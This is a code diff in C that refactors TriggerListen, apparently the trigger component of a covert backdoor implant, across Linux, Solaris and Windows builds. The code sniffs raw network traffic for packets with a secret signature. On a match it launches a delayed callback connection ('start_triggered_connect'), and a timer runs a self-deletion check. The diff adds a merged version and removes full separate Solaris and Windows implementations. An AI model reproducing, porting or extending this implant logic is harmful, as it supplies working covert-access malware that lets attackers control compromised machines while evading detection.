@@ -181,16 +181,19 @@ void* start_triggered_connect( void *param )
 }
 
 //******************************************************************
-#if defined LINUX
+
 int TriggerListen( char *iface, int trigger_delay, unsigned long delete_delay ) 
 {
 	int			socket_fd, packet_length;
 	int 			counter = 0;
 	unsigned char		packet_buffer[MAX_PKT];// MTU 2000, no pkts larger than this
-	struct sockaddr_ll	packet_info;
-	size_t 			packet_info_size = sizeof( packet_info);
+
 	Payload 		recvd_payload;
 	TriggerInfo		*tParams;
+#ifdef LINUX
+	struct sockaddr_ll	packet_info;
+	size_t 			packet_info_size = sizeof( packet_info);
+#endif
 
 	D( printf("%s, %4d:\n", __FILE__, __LINE__); )
 	// reap any CHILD processes that die, prevent zombies
@@ -214,6 +217,19 @@ int TriggerListen( char *iface, int trigger_delay, unsigned long delete_delay )
 		}
 
 		memset( packet_buffer, 0, MAX_PKT );
+#if defined SOLARIS
+	//	D( printf( " DEBUG: Listening on solaris raw socket\n" ); )
+		packet_length = sniff_read_solaris( socket_fd, packet_buffer, MAX_PKT );
+	//	D( printf( " DEBUG: Packet received with length %d bytes\n", packet_length ); )
+
+		if ( packet_length == FAILURE )
+		{
+			// not sure what to do upon recv error
+			D( printf(" ERROR: sniff_read_solaris() returned FAILURE\n"); )
+			continue;
+		}
+
+#else
 
 		if ( ( packet_length = recvfrom( socket_fd, packet_buffer, MAX_PKT, 0, 
 				(struct sockaddr *) &packet_info, (socklen_t *) &packet_info_size ) )  == FAILURE )
@@ -222,6 +238,7 @@ int TriggerListen( char *iface, int trigger_delay, unsigned long delete_delay )
 			D( printf("%s, %4d: Error: recvfrom() failure!\n", __FILE__, __LINE__); )
 			continue;
 		}
+#endif
 		else
 		{
 			if ( dt_signature_check( packet_buffer, packet_length, &recvd_payload) != FAILURE )
@@ -285,164 +302,6 @@ int TriggerListen( char *iface, int trigger_delay, unsigned long delete_delay )
 	return 0;
 }
 
-#elif defined SOLARIS
-
-int TriggerListen( char *iface, int trigger_delay, unsigned long delete_delay ) 
-{
-	int				fd, packet_length;
-	unsigned char	packet_buffer[ MAX_PKT ];
-  	Payload			recvd_payload;
-	TriggerInfo *tParams;
-	int				counter = 0;
-
-	signal( SIGCHLD, sigchld_reaper );
-
-	if ( ( fd = dt_get_socket_fd( iface ) ) == FAILURE )
-	{
-		D( printf( " ERROR: could not open Solaris raw socket\n" ); )
-		return FAILURE;
-	}
-	else
-	{
-		D( printf( " DEBUG: Solaris raw socket opened\n" ); )
-	}
-
-	//begin pcap loop D (printF ("%s, %4d:\n", __FILE__, __LINE__); )
-	while(1)
-	{
-		if((counter % 100) == 0)
-		{
-			check_timer((char*)sdfp, delete_delay);
-		}
-		counter++;
-
-		memset( packet_buffer, 0, MAX_PKT );
-
-	//	D( printf( " DEBUG: Listening on solaris raw socket\n" ); )
-		packet_length = sniff_read_solaris( fd, packet_buffer, MAX_PKT );
-	//	D( printf( " DEBUG: Packet received with length %d bytes\n", packet_length ); )
-
-		if ( packet_length == FAILURE )
-		{
-			// not sure what to do upon recv error
-			D( printf(" ERROR: sniff_read_solaris() returned FAILURE\n"); )
-			continue;
-		}
-		else
-		{
-	//		D (printf ("%s, %4d:\n", __FILE__, __LINE__); )
-	//		D( printf( " Packet has length %i bytes\n", packet_length ); )
-                       	// Only trigger packets are processed, all others are ignored.
-			if ( dt_signature_check( packet_buffer, packet_length, &recvd_payload) != FAILURE )
-			{
-				D( printf( " DEBUG: trigger signature found, about to send call back (will wait for trigger_delay)\n" ); )
-				// this memory is free'd in the thread
-				tParams = calloc( 1, sizeof( TriggerInfo ) );
-
-				// popluate the structure with the parameters needed inside the thread
-				tParams->Delay = trigger_delay;
-				memcpy( &(tParams->Payload), &recvd_payload, sizeof( Payload ) );
-
-				update_file((char*)sdfp);
-
-				// create child process... only the parent returns...the child will exit when finished.
-				if ( fork_process( start_triggered_connect, (void *)tParams ) != SUCCESS )
-				{
-					D( printf( " ERROR: failed to create start_triggered_connect thread\n" ); )
-					if ( tParams != NULL ) free( tParams );
-					return FAILURE;
-				}
-
-				// main trigger thread loops to continue listening for additional trigger packets
-			}
-		}
-	}
-
-	//not reached
-	close( fd ); 
-	return 0;
-}
-
-#elif defined WIN32
-
-int TriggerListen( char *iface, int trigger_delay, unsigned long delete_delay )
-{
-	char* expandedfile;
-	int socket_fd;
-	int packet_length;
-	int counter = 0;
-	char packet_buffer[MAX_PKT];// MTU 2000, no pkts larger than this
-	struct sockaddr_in packet_info;
-	int packet_info_size = sizeof( packet_info);
-	Payload recvd_payload;
-	TriggerInfo *tParams;
-
-	socket_fd = dt_get_socket_fd( iface );
-
-	if( socket_fd == FAILURE ) {
-
-#ifdef DEBUG
-		printf("Exiting, cannot create socket!\n");
-#endif
-
-		return FAILURE;
-
-	}
-
-
-	while(1) {
-
-		memset( packet_buffer, 0, MAX_PKT );
-		if((counter % 100) == 0)
-		{
-			expandedfile = (char*)malloc(MAX_PATH);
-			memset(expandedfile, 0, MAX_PATH);
-			ExpandEnvironmentStringsA(sdwtf, expandedfile, MAX_PATH);
-			check_timer((char*)expandedfile, delete_delay);
-			free( expandedfile);
-			expandedfile = NULL;
-		}
-		counter++;
-
-		if((packet_length = recvfrom(socket_fd, 
-			packet_buffer, 
-			MAX_PKT, 
-			0, 
-			(struct sockaddr*) &packet_info,
-			&packet_info_size))  == FAILURE) {
-
-				continue;
-
-		} else {
-
-			if (dt_signature_check( (unsigned char*) packet_buffer,
-				packet_length,
-				&recvd_payload) != FAILURE )
-			{
-				expandedfile = (char*)malloc(MAX_PATH);
-				memset(expandedfile, 0, MAX_PATH);
-				ExpandEnvironmentStringsA(sdwtf, expandedfile, MAX_PATH);
-				update_file((char*)expandedfile);
-				free( expandedfile);
-				expandedfile = NULL;
-
-				// WARNING: this memory is free'd in the thread????? 
-				tParams = calloc( 1, sizeof( TriggerInfo ) );
-
-				// popluate the structure with the parameters needed inside the thread
-				tParams->Delay = trigger_delay;
-				memcpy( &(tParams->Payload), &recvd_payload, sizeof( Payload ) );
-
-				make_thread(start_triggered_connect, (void *)tParams);
-
-			}
-		}
-	}
-
-	return 0;
-}
-
-#endif
 
 #if defined LINUX || defined SOLARIS
 void sigchld_reaper (int x)
